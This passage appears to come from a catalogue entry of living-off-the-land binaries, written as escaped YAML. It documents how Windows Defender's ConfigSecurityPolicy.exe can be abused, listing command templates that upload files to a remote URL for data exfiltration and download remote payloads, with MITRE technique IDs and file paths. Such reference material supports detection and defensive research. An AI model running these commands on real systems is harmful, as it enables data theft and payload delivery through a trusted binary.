        \ each of the co-management workloads. Being able to use different pilot collections allows you\
        \ to take a more granular approach when shifting workloads.\nAuthor: Ialle Teixeira\nCreated:\
        \ 2020-09-04\nCommands:\n  - Command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}\n \
        \   Description: Upload file, credentials or data exfiltration in general\n    Usecase: Upload\
        \ file\n    Category: Upload\n    Privileges: User\n    MitreID: T1567\n    OperatingSystem: Windows\
        \ 10\n  - Command: ConfigSecurityPolicy.exe {REMOTEURL}\n    Description: It will download a remote\
        \ payload and place it in INetCache.\n    Usecase: Downloads payload from remote server\n    Category:\
        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows\
        \ 11\n    Tags:\n      - Download: INetCache\nFull_Path:\n  - Path: C:\\Program Files\\Windows\
        \ Defender\\ConfigSecurityPolicy.exe\n  - Path: C:\\ProgramData\\Microsoft\\Windows Defender\\\
